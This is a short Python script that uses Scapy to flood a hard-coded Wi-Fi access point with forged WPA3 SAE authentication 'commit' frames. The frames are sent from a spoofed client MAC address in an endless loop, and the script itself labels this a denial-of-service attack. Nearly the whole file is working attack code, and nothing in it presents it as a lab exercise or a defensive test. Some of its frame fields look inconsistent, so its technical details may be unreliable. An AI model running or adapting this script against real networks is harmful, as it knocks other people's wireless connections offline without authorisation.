from scapy.all import *
import time

target_ap_mac = "96:44:5D:85:F9:41"
target_bssid = target_ap_mac

fake_client_mac = "AA:BB:CC:DD:EE:FF"

def send_commit_frame(target_bssid, fake_client_mac):
    frame = RadioTap() / \
            Dot11(type=1, subtype=11, addr1=target_bssid, addr2=fake_client_mac, addr3=target_bssid) / \
            Dot11Auth(algo=3, seqnum=1, status=0)

    sendp(frame, iface="wlan0", count=1, inter=0.1)

def dos_attack(target_bssid, fake_client_mac):
    print(f"Starting DoS attack on {target_bssid} from {fake_client_mac}")
    while True:
        send_commit_frame(target_bssid, fake_client_mac)
        time.sleep(0.05)

if __name__ == "__main__":
    try:
        dos_attack(target_bssid, fake_client_mac)
    except KeyboardInterrupt:
        print("DoS attack stopped.")
